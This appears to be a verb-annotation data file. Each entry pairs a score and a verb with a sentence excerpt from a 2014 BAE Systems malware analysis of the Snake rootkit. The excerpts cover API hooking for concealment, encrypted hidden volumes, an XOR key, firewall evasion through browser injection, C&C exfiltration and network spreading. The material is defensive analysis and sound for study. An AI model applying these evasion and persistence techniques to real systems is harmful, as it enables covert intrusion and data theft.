hibernate, staying fully inactive for a number of days, makes its detection during that time very\ndifficult')(0.375, 'staying', ' Its ability to hibernate, staying fully inactive for a number of days, makes its detection during that time very\ndifficult')(0.25, 'stays', '\n\nAs long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web\nservers')(1.0, 'parses', ' on TDI_RECEIVE TDI event or ClientEventReceive() event notification triggered\nthrough its TDI Filter Driver), it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic')(1.0, 'adjusting', ' Unlike traditional worm\ntechniques, this process is rather manual, but its danger is in the fact that the attacker can flexibly craft new attack methods,\nadjusting them to the hosts present within the network, thus preying on the weakest (least updated, most vulnerable) victims along\nits path')(0.4117647058823529, 'reflected', '\n\nAs a result, whenever the data is saved into the volume Hd1, it will be scrambled on-the-fly, and reflected in the persistent storage\nfile hotfix.dat, which is physically located within the rootkit’s ‘home’ directory:\n<figure>\n   Z:\\WINDOWS\\$NtuninstallQ817473$>dir\n     Volume in drive Z has no label')(0.45454545454545453, 'Hiding', '\n\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed')(0.6, 'stay', '\n\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed')(0.9166666666666666, 'applies', ' In order to decrypt it, the malware first\napplies the XOR mask to the bytes that start from offset 0x40:\n<list>\n    1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6g\n    s923HL34x2f5cvd0fk6c1a0s\n</list>\nAn identical XOR mask was also used by Agent.BTZ')(1.0, 'sets', '\n\nTo encrypt data stored on its virtual partitions, the driver sets a hook for another API:\n<list>\n         IofCallDriver()\n</list>\nTo re-infect the usermode process svchost.exe and to re-enable its network drivers, the rootkit hooks these APIs:\n<list>\n    •\t ZwCreateThread\n    •\t ZwCreateUserProcess\n</list>\n\n</section>\n<section>\n<heading>\nWFP CALLOUT DRIVER</heading>\nSnake then proceeds to the task of deep packet inspection and modification')(0.9090909090909091, 'loads', ' In order to find the variable in kernel memory, the Snake\ndropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll’s function CiInitialize(), and then\nSepInitializeCodeIntegrity() within it')(0.6153846153846154, 'locates', ' In order to find the variable in kernel memory, the Snake\ndropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll’s function CiInitialize(), and then\nSepInitializeCodeIntegrity() within it')(0.4666666666666667, 'watches', '\n\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n<list>\n    •\t ZwQuerySystemInformation\n    •\t ZwQueryInformationProcess\n    •\t ZwClose\n    •\t ZwTerminateProcess\n</list>\nThe driver then watches for all userland processes to see if they load any web pages')(0.6153846153846154, 'hide', '\n\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n<list>\n    •\t ZwQuerySystemInformation\n    •\t ZwQueryInformationProcess\n    •\t ZwClose\n    •\t ZwTerminateProcess\n</list>\nThe driver then watches for all userland processes to see if they load any web pages')(1.0, 'sets', '\n\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n<list>\n    •\t ZwQuerySystemInformation\n    •\t ZwQueryInformationProcess\n    •\t ZwClose\n    •\t ZwTerminateProcess\n</list>\nThe driver then watches for all userland processes to see if they load any web pages')(0.42857142857142855, 'function', ' a browser)\n\n\n                                                                                                            2\n                                                                                    Embedded\n                       Snake’s Kernel Mode                                          DLL Module\n                        Driver, with the DLL\n                       module embedded in it\n</figure>\n\nThe diagram illustrates the operation steps 1-4:\n\n    1     First, the malicious driver with the embedded DLL module injects that DLL into a system process,\n          such as services.exe; once loaded, the DLL will function in the ‘pipe server’ mode')(0.16666666666666666, 'ask', '\n</list>\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other\noperations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry\nunder the aforementioned ShellCore value')(0.5714285714285714, 'perform', '\n</list>\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other\noperations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry\nunder the aforementioned ShellCore value')(0.5, 'saving', '\n</list>\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other\noperations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry\nunder the aforementioned ShellCore value')(0.5, 'save', '\n</list>\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other\noperations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry\nunder the aforementioned ShellCore value')(0.9230769230769231, 'load', ' The Snake dropper contains both 32-bit and 64-bit unsigned drivers, and it can successfully load its\nunsigned 64-bit driver on a 64-bit version of Windows XP – as driver signing is not enforced it does not have to resort to any tricks\nunder this OS version')(1.0, 'used', '\n\nFull list of the named pipes used for communications is provided below:\n<list>\n    •\t \\Device\\NamedPipe\\isapi_http\n    •\t \\Device\\NamedPipe\\isapi_log\n    •\t \\Device\\NamedPipe\\isapi_dg\n    •\t \\Device\\NamedPipe\\services_control\n</list>\nMessages submitted into the pipes are wrapped into the structures')(1.0, 'submitted', '\n\nFull list of the named pipes used for communications is provided below:\n<list>\n    •\t \\Device\\NamedPipe\\isapi_http\n    •\t \\Device\\NamedPipe\\isapi_log\n    •\t \\Device\\NamedPipe\\isapi_dg\n    •\t \\Device\\NamedPipe\\services_control\n</list>\nMessages submitted into the pipes are wrapped into the structures')(0.6666666666666666, 'calls', '\n\nNext, the driver sets up the hooks for the following kernel-mode APIs:\n<list>\n    •\t ZwCreateThread\n    •\t ZwCreateUserProcess\n    •\t ZwShutdownSystem\n</list>\nAfter that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started')(0.7777777777777778, 'invoking', '\n<figure>\n    Intercepting Network Data\n\n\n                                NdisMIndicateReceiveNetBufferLists()\n\n     NDIS Protocol                                        Miniport\n                                  NDIS\n        Driver                                             Driver\n\n       ProtocolReceiveNetBufferLists()\n</figure>\n<figure>\n\n    Sending Network Data\n\n                                    MiniportSendNetBufferLists()\n\n\n     NDIS Protocol                                       Miniport\n                                  NDIS\n        Driver                                            Driver\n\n           NdisSendNetBufferLists()\n</figure>\nWhenever the underlying miniport driver\nreceives data from the network, it calls NDIS\nby invoking a data receive indication function\nNdisMIndicateReceiveNetBufferLists()')(1.0, 'receives', '\n<figure>\n    Intercepting Network Data\n\n\n                                NdisMIndicateReceiveNetBufferLists()\n\n     NDIS Protocol                                        Miniport\n                                  NDIS\n        Driver                                             Driver\n\n       ProtocolReceiveNetBufferLists()\n</figure>\n<figure>\n\n    Sending Network Data\n\n                                    MiniportSendNetBufferLists()\n\n\n     NDIS Protocol                                       Miniport\n                                  NDIS\n        Driver                                            Driver\n\n           NdisSendNetBufferLists()\n</figure>\nWhenever the underlying miniport driver\nreceives data from the network, it calls NDIS\nby invoking a data receive indication function\nNdisMIndicateReceiveNetBufferLists()')(0.7692307692307693, 'creates', '\n\n</section>\n\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        7</footer>\n\n\x0c\n<section>\n<heading>ROOTKIT EXECUTION</heading>\nWhen first executed, the driver creates device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32')(0.8333333333333334, 'inject', '\n\nThe ZwClose() hook handler is used to inject the DLL module into the userland processes')(0.7777777777777778, 'making', '\n\nWith its own miniport handler functions, it can send/receive data by using a private TCP/IP stack, bypassing all firewall hooks, and\nmaking its open ports invisible to scanners')(0.4, 'bypassing', '\n\nWith its own miniport handler functions, it can send/receive data by using a private TCP/IP stack, bypassing all firewall hooks, and\nmaking its open ports invisible to scanners')(1.0, 'update', '\n\nThe ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible,\nmaking possible the existence of the hybrid (kernel-centric and usermode-centric) architectures')(0.5, 'intercepts', '\n\nHowever, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module\ninto the process that initiated connection (the browser)')(0.8461538461538461, 'detects', '\n\nWhen run as a command line tool, with its logic defined with the command line switches, this tool enumerates other network hosts\nand detects what Windows RPC services are enabled at the endpoints')(0.8888888888888888, 'drops', '\n\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with\nXOR 0xAA applied on top of it, so the driver decrypts it first')(0.6666666666666666, 'applied', '\n\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with\nXOR 0xAA applied on top of it, so the driver decrypts it first')(0.8571428571428571, 'registers', '\n\n\n</section>\n<section>\n<heading>\nNDIS PROTOCOL DRIVER</heading>\nThe Snake rootkit registers itself as Network Driver Interface Specification (NDIS) protocol driver')(0.4444444444444444, 'read', ' It then uses these identifiers to write a message to and read a message from the associated named pipes')(0.8, 'write', ' It then uses these identifiers to write a message to and read a message from the associated named pipes')(0.8666666666666667, 'identify', '\n\nBy using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim')(0.7142857142857143, 'stay', '\n\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect\nany newly created processes, and restore its driver file in case it gets deleted')(0.5, 'restore', '\n\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect\nany newly created processes, and restore its driver file in case it gets deleted')(1.0, 'infect', '\n\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect\nany newly created processes, and restore its driver file in case it gets deleted')(0.6363636363636364, 'saved', ' The fingerprinting allows it to reveal the following characteristics for each host found in the network:\n<list>\n   •\t   the version of the operating system\n   •\t   version of the service pack\n   •\t   the installed network services\n</list>\nThe data it retrieves is encrypted and saved into a configuration file %system%\\vtmon.bin')(1.0, 'reveal', ' The fingerprinting allows it to reveal the following characteristics for each host found in the network:\n<list>\n   •\t   the version of the operating system\n   •\t   version of the service pack\n   •\t   the installed network services\n</list>\nThe data it retrieves is encrypted and saved into a configuration file %system%\\vtmon.bin')(0.5, 'install', ' On a 64-bit OS, it will install a 64-bit driver')(0.15384615384615385, 'behaves', '\n\nOn 64-bit versions of Windows Vista and above it behaves differently')(0.4, 'uses', '\nIt may rely on the following Internet Media types (MIME types) for data exfiltration:\n<list>\n   •\t     application/x-shockwave-flash\n   •\t     image/pjpeg\n   •\t     image/jpeg\n   •\t     image/x-xbitmap\n   •     image/gif\n   •     application/msword\n   •     application/vnd.ms-excel\n   •     application/vnd.ms-powerpoint\n</list>\nRequest type it uses can either be POST of GET, and C&C server resource name is /default.asp')(0.25, 'be', '\nIt may rely on the following Internet Media types (MIME types) for data exfiltration:\n<list>\n   •\t     application/x-shockwave-flash\n   •\t     image/pjpeg\n   •\t     image/jpeg\n   •\t     image/x-xbitmap\n   •     image/gif\n   •     application/msword\n   •     application/vnd.ms-excel\n   •     application/vnd.ms-powerpoint\n</list>\nRequest type it uses can either be POST of GET, and C&C server resource name is /default.asp')(0.16666666666666666, 'is', '\nIt may rely on the following Internet Media types (MIME types) for data exfiltration:\n<list>\n   •\t     application/x-shockwave-flash\n   •\t     image/pjpeg\n   •\t     image/jpeg\n   •\t     image/x-xbitmap\n   •     image/gif\n   •     application/msword\n   •     application/vnd.ms-excel\n   •     application/vnd.ms-powerpoint\n</list>\nRequest type it uses can either be POST of GET, and C&C server resource name is /default.asp')(0.5714285714285714, 'store', '\n\nThe files within that directory are used by the rootkit to store configuration and log data')(0.7142857142857143, 'install', ' If so, it will install a TDI filter driver')(0.7647058823529411, 'keep', '\n\nThis delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as\npossible')(0.7142857142857143, 'routing', '\n\nThe reason behind such behaviour is that the driver is acting in this mode like a proxy, routing requests from other infected hosts to\na remote C&C server')(0.28, 'contain', '\n\n Other files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe,\n\n where rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command\n outputs, intercepted keystrokes, and other output logs')(0.045454545454545456, 'intercepted', '\n\n Other files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe,\n\n where rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command\n outputs, intercepted keystrokes, and other output logs')(0.75, 'post', '\n\nThe remote commands received by this Snake DLL module are designed to set up various communication parameters:\n<list>\n     •\t    http_log\n     •\t    http_no_pragma_cache\n     •\t    http_no_accept\n     •\t    proxy_useragent\n     •\t    proxy_bypass\n     •\t    proxy_server\n     •\t    proxy_discover\n     •\t    proxy_passwd\n     •\t    proxy_user\n     •\t    check_inet\n     •     redir_str\n     •     http_max_opt\n     •     http_option\n     •     http_uri\n     •     no_server_hijack\n     •     imp_level\n     •     net_password\n     •     net_user\n     •     write_peer_nfo\n     •     read_peer_nfo\n</list>\nTo post the data, the DLL can use the following User-Agent string “Mozilla/4.0 (compatible; MSIE 6.0)”')(0.8888888888888888, 'received', '\n\nThe remote commands received by this Snake DLL module are designed to set up various communication parameters:\n<list>\n     •\t    http_log\n     •\t    http_no_pragma_cache\n     •\t    http_no_accept\n     •\t    proxy_useragent\n     •\t    proxy_bypass\n     •\t    proxy_server\n     •\t    proxy_discover\n     •\t    proxy_passwd\n     •\t    proxy_user\n     •\t    check_inet\n     •     redir_str\n     •     http_max_opt\n     •     http_option\n     •     http_uri\n     •     no_server_hijack\n     •     imp_level\n     •     net_password\n     •     net_user\n     •     write_peer_nfo\n     •     read_peer_nfo\n</list>\nTo post the data, the DLL can use the following User-Agent string “Mozilla/4.0 (compatible; MSIE 6.0)”')(0.4, 'initiates', '\n\nOnce injected, the module initiates polling from one of the hard-coded C&C servers')(0.5, 'read', '\n\nThe first partition is created with the following steps:\n<list>\n    •\t   the driver creates a 100Mb (0x6400000 bytes) file %windows%\\$NtUninstallQ817473$\\hotfix.dat by calling\n         IoCreateFile() API\n\n    •\t   then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling\n         ZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed\n\n    •\t   next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()\n\n    •\t   finally, it creates device \\Device\\RawDisk1 from the section map and mounts it as \\\\.\\Hd1\n</list>\nThe hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is\nwritten to or read from the volume')(0.46153846153846156, 'provides', '\n\nThe first partition is created with the following steps:\n<list>\n    •\t   the driver creates a 100Mb (0x6400000 bytes) file %windows%\\$NtUninstallQ817473$\\hotfix.dat by calling\n         IoCreateFile() API\n\n    •\t   then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling\n         ZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed\n\n    •\t   next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()\n\n    •\t   finally, it creates device \\Device\\RawDisk1 from the section map and mounts it as \\\\.\\Hd1\n</list>\nThe hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is\nwritten to or read from the volume')(0.8888888888888888, 'installed', '\n\nThe first partition is created with the following steps:\n<list>\n    •\t   the driver creates a 100Mb (0x6400000 bytes) file %windows%\\$NtUninstallQ817473$\\hotfix.dat by calling\n         IoCreateFile() API\n\n    •\t   then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling\n         ZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed\n\n    •\t   next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()\n\n    •\t   finally, it creates device \\Device\\RawDisk1 from the section map and mounts it as \\\\.\\Hd1\n</list>\nThe hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is\nwritten to or read from the volume')(0.875, 'using', ' It is also sophisticated, using complex techniques for evading host defences and\nproviding the attackers covert communication channels')(0.625, 'providing', ' It is also sophisticated, using complex techniques for evading host defences and\nproviding the attackers covert communication channels')(0.7777777777777778, 'places', ' The registration is ensured with creation of the following\nregistry entries:\n<list>\n    ErrorControl = 0\n    Group = “Streams Drivers”\n    ImagePath = %windows%\\$NtUninstallQ817473$\\fdisk.sys\n    Start = 1 [SYSTEM]\n    Type = 1\n\nin the newly created registry key\n\n    HKEY_LOCAL_MACHINE\\System\\CurrentControlSer\\Services\\Ultra3\n</list>\nThe driver then flags the following events with the notification purposes:\n<list>\n    \\BaseNamedObjects\\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}\n    \\BaseNamedObjects\\shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}\n</list>\nThe rootkit then places a number of the hooks')(0.5454545454545454, 'use', '\nOne of the parameters defines the pipe name(s) that the DLL should use for its communications')(0.3333333333333333, 'fingerprint', ' By\nknowing what RPC services are running, it can successfully fingerprint all network hosts by mimicking the Metasploit’s logic of OS\nfingerprinting via SMB')(0.8, 'identify', ' The structures appear to contain headers to allow the pipe\nserver, that runs within an infected userland module, to identify the messages first and then unwrap the structures accordingly')(0.5, 'parses', ' Then it parses the function’s code to locate the offset of the variable')(0.625, 'delegate', '\nOne approach is to delegate the network communication engine to usermode code, backed up by a usermode rootkit')(0.95, 'craft', ' As there are no validations made for the UserBuffer an\nattacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with:\n<code>\n    01     /**\n    02       * Device I/O Control entry point')(0.7777777777777778, 'created', ' It’s worth noting that Agent.BTZ used the same XOR key for its\nlogs as the most recent variants:\n<list>\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n</list>\nLog files created by the latest samples of Snake, compiled in 2013 and 2014, were successfully decrypted with the same XOR key')(0.5714285714285714, 'used', ' It’s worth noting that Agent.BTZ used the same XOR key for its\nlogs as the most recent variants:\n<list>\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n</list>\nLog files created by the latest samples of Snake, compiled in 2013 and 2014, were successfully decrypted with the same XOR key')(0.7692307692307693, 'calls', '\n\nTo write data, it opens the device with CreateFile(“\\\\.\\vstor32”), then calls DeviceIoControl() API on its handle with\nIOCTL code of 0x222038')(0.5, 'write', '\n\nTo write data, it opens the device with CreateFile(“\\\\.\\vstor32”), then calls DeviceIoControl() API on its handle with\nIOCTL code of 0x222038')(0.7142857142857143, 'opens', '\n\nTo write data, it opens the device with CreateFile(“\\\\.\\vstor32”), then calls DeviceIoControl() API on its handle with\nIOCTL code of 0x222038')(0.7142857142857143, 'received', '\n\nFor example, the message headers could be:\n<list>\n    •\t domc.np\n    •\t frag.np\n</list>\n\nOnce received from the pipes and unwrapped/decoded, the data is then handled by the usermode DLL as per the data intention -\nwhether it’s a traffic sniffing task, a peer-2-peer client logic, a logging task, or a task of saving received files into the virtual volumes')(0.75, 'blend', '\n\nThe purpose of this behaviour is to blend Snake’s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile\nat the same time')(0.5, 'keeping', '\n\nThe purpose of this behaviour is to blend Snake’s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile\nat the same time')(0.5, 'bypassing', '\n\nThe purpose of this behaviour is to blend Snake’s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile\nat the same time')(0.875, 'block', '\n\nThe ZwReadFile() hook handler will block access to the home directory where the rootkit keeps its file')(0.7777777777777778, 'listen', ' In order to switch into that mode, a dedicated thread is spawned to listen for IPC\nmessages received through the pipes')(0.5833333333333334, 'send', '\n\nTo delegate different types of tasks, the clients send messages to the pipe server using the following task identification headers:\n<list>\n    •\t   DATA\n    •\t   CREATE\n    •\t   CMD\n    •\t   POST\n    •\t   GET\n    •\t   DEL\n    •\t   REGISTR\n    •\t   COPY\n</list>\nThe usermode component of Snake communicates with its kernel-mode driver via a device called \\\\.\\vstor32 (created under\nkernel as \\Device\\vstor32)')(0.75, 'is', '\n\nFor example, the virtual partitions are used by kernel-centric Snake variants, where the kernel-mode driver is responsible for the\ncommunications')(0.8181818181818182, 'installs', ' Once executed, the dropper\ninstalls the kernel mode driver in a pre-defined location')(1.0, 'executed', ' Once executed, the dropper\ninstalls the kernel mode driver in a pre-defined location')(0.36363636363636365, 'provide', ' As demonstrated, the backdoor commands allow Snake to provide remote attackers with full remote access to the\ncompromised system')(0.35714285714285715, 'allow', ' As demonstrated, the backdoor commands allow Snake to provide remote attackers with full remote access to the\ncompromised system')(0.8571428571428571, 'keep', '\n</figure>\n\n The ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode\n DLL, as these volumes are accessible both from usermode and kernel mode')(0.5714285714285714, 'intercepts', ' This way it intercepts all requests along with their\nparameters via IRP (IO request package) hooks')(1.0, 'injected', '\n\nAs soon as the tool made its first GET requests, the driver immediately injected a malicious DLL module in it, and that module\nstarted producing the following traffic:\n<table>\nNo')(0.14285714285714285, 'started', '\n\nAs soon as the tool made its first GET requests, the driver immediately injected a malicious DLL module in it, and that module\nstarted producing the following traffic:\n<table>\nNo')(0.75, 'blocks', ' In one example, the rootkit blocks access to registry entries that contain the strings “Ultra3” and “~ROOT”')(0.2, 'detects', '\n\n\nIf the rootkit detects that the OS version is pre-Vista (e.g')(0.2857142857142857, 'works', '\n   •\t   In the third mode, it works in the ‘pipe server’ mode, when it passes the web requests it is interested in (as a client) to the\n        pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes')(0.20833333333333334, 'passes', '\n   •\t   In the third mode, it works in the ‘pipe server’ mode, when it passes the web requests it is interested in (as a client) to the\n        pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes')(0.3333333333333333, 'hooks', '\n\n\n</section>\n<section>\n<heading>\nSYSTEM HOOKS</heading>\nThe first API it hooks is IoCreateDevice()')(0.5, 'start', '\n\n    4      Once the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C,\n\n          bypassing the host-based firewalls that keep an infected system process in a white-list')(0.8, 'bypassing', '\n\n    4      Once the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C,\n\n          bypassing the host-based firewalls that keep an infected system process in a white-list')(0.6666666666666666, 'obtain', '\n\nIn order to be able to perform the steps above, the dropper must first obtain Administrator privileges')(0.625, 'creates', '\n\nThe logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too')(0.8666666666666667, 'uses', '\n   •\t   In the second mode, it uses Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(),\n        send(), etc')(0.5, 'install', ' On a 32-bit OS, it will install a 32-bit driver')(0.6, 'creates', ' It is designed to perform the high-level tasks\nsuch as:\n<list>\n   •\t     manage the configuration data (by using a queue)\n   •\t     exfiltrate data by using Windows Internet (WinINet) APIs or Windows Sockets 2 (Winsock) APIs:\n           •\t   communicate with the C&C server and receive commands to execute\n           •\t   submit logs to the C&C server and other reports\n</list>\nWhen the DLL activates, it reads configuration parameters from the configuration queue, that the driver creates on a virtual volume')(1.0, 'reads', ' It is designed to perform the high-level tasks\nsuch as:\n<list>\n   •\t     manage the configuration data (by using a queue)\n   •\t     exfiltrate data by using Windows Internet (WinINet) APIs or Windows Sockets 2 (Winsock) APIs:\n           •\t   communicate with the C&C server and receive commands to execute\n           •\t   submit logs to the C&C server and other reports\n</list>\nWhen the DLL activates, it reads configuration parameters from the configuration queue, that the driver creates on a virtual volume')(0.625, 'start', '\n\n    3      In the ‘pipe mode’ of operation, the injected DLL will start communicating with the pipe server by sending messages into\n         the established inter-process communication pipes')(0.8181818181818182, 'sending', '\n\n    3      In the ‘pipe mode’ of operation, the injected DLL will start communicating with the pipe server by sending messages into\n         the established inter-process communication pipes')(0.6666666666666666, 'creating', ' Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver, a tool for\ncreating NTFS file systems, and the initial message queue file which is written into the virtual volume')(0.75, 'triggers', ' When that happens, the\nrootkit triggers an event named \\BaseNamedObjects\\wininet_activate')(0.35714285714285715, 'checks', ' The installed hook handler calls the original API and then checks if the name of the\ndevice is netbt or afd')(0.7272727272727273, 'calls', ' The installed hook handler calls the original API and then checks if the name of the\ndevice is netbt or afd')(0.21428571428571427, 'generate', ' Its ability to generate malicious traffic whenever the user\ngoes online and start loading the web pages allows it to ‘blend in’ with the legitimate communications')(0.7777777777777778, 'supports', ' kbdfaori.dll), log directory, and the registry entry ShellCore that stores other configuration details:\n\n         03:52:02 TVer=1.2\n         03:52:02 Parent:C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n         03:52:02 ver 3.2.0.0a inj             dll K:0      PID:712,\n         C:\\WINDOWS\\system32\\kbdfaori.dll,\n         hostID:ea5cfa5ea1681bd6(16887647987074341846)\n         03:52:02 C:\\WINDOWS\\$NtUninstallQ812589$,\n         Temp:C:\\WINDOWS\\$NtUninstallQ812589$\\SPUNINST\\Temp\n         03:52:02 REG:Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n         03:52:02 ModuleStart: 03:51:42\n\n   •\t scmp.bin - pipe server log that shows its assigned name (COMPUTERNAME is the name of the test system) and\n      what processes it operates from:\n\n         02:04:24 TVer=1.6\n         02:04:24 SPCOMPUTERNAME: Pipe server thread start\n         02:04:24 Inj[1620]:explorer.exe\n         03:51:42 Inj[712]:iexplore.exe\n\n    •\t ucmp.bin - another pipe server log:\n\n         02:04:44 TVer=1.6\n         02:04:44 UPCOMPUTERNAME: Pipe server thread start\n</list>\n\n</section>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014    11</footer>\n\n\x0c\n<section>\n<heading>INTER-PROCESS COMMUNICATION</heading>\nAnalysis of the sample reveals that it supports 3 modes of fetching C&C commands')(0.9, 'registers', '\n\nIn order to accomplish it, it registers a callout driver for Windows Filtering Platform (WFP), an architecture first introduced with\nWindows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect/block malicious traffic')(0.7272727272727273, 'injected', '\n\nIn both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes')(1.0, 'installed', '\n\nIn both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes')(0.25, 'generate', ' Windows Server 2003), it will\ninvoke FwpsStreamInjectAsync0() API in order to generate outbound requests')(1.0, 'provide', ' It is designed to covertly install a backdoor on a compromised system, hide the presence of its\ncomponents, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism')(0.75, 'enable', ' It is designed to covertly install a backdoor on a compromised system, hide the presence of its\ncomponents, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism')(1.0, 'hide', ' It is designed to covertly install a backdoor on a compromised system, hide the presence of its\ncomponents, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism')(0.7777777777777778, 'blocked', ' In one of the analysed\nkernel-centric Snake samples the home directory was hard-coded as %windows%\\$NtUninstallQ817473$, so it blocked file\nread access from that directory')(0.6666666666666666, 'replicate', '\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further')(0.875, 'repeating', '\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further')(0.6666666666666666, 'spreading', '\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further')(1.0, 'delivers', '\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further')(0.6666666666666666, 'exploits', '\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further')(0.6363636363636364, 'creates', '\n\nThe analysed 32-bit dropper creates a driver in the following location:\n<list>\n%windows%\\$NtUninstallQ817473$\\fdisk.sys\n</list>\nHowever, different samples may use a different path and driver file name')(0.25, 'make', ' The traffic is then routed through that host to make external control and data exfiltration still possible')(0.7142857142857143, 'injected', '\n</section>\n<footer>                                                       BAE Systems Applied Intelligence: Snake Rootkit Report 2014            23</footer>\n\n\x0c\n<section>\n<heading>USERMODE DLLS</heading>\nThe usermode DLLs injected by the kernel-mode driver into the userland system process (e.g')(0.18181818181818182, 'execute', ' If the\ndata contains commands from C&C, the DLL module is expected to execute them and report results back to the driver to be\ndelivered back to C&C')(0.7142857142857143, 'installs', '\n\n\n\n</section>\n<section>\n<heading>\nNDIS HOOKING</heading>\nFor NDIS versions 5.X, Snake rootkit contains code that installs NDIS filter intermediate driver')(0.75, 'detects', '\n\n    2      As soon as the driver detects a usermode process that goes online (e.g')(0.45, 'deliver', '\nThe attacker may then craft an exploit against those hosts, possibly by using the Metasploit framework, and then deliver the\ngenerated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the\n‘exp_os’ switch')(0.875, 'block', '\n\nIn order to hide its components, the driver hooks the following APIs:\n<list>\n    •\t ZwQueryKey\n    •\t ZwEnumerateKey\n    •\t ZwCreateKey\n    •\t ZwSaveKey\n    •\t ZwReadFile\n    •\t ZwQuerySystemInformation\n    •\t ZwQueryInformationProcess\n    •\t ZwClose\n    •\t ZwTerminateProcess\n    •\t ZwShutdownSystem\n    •\t ObOpenObjectByName\n</list>\n<footer>                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           14</footer>\n\x0cFor example, the hook handlers of the registry-related APIs will block access to the registry entries that contain the name of the\ndriver')(0.8, 'hooks', '\n\nIn order to hide its components, the driver hooks the following APIs:\n<list>\n    •\t ZwQueryKey\n    •\t ZwEnumerateKey\n    •\t ZwCreateKey\n    •\t 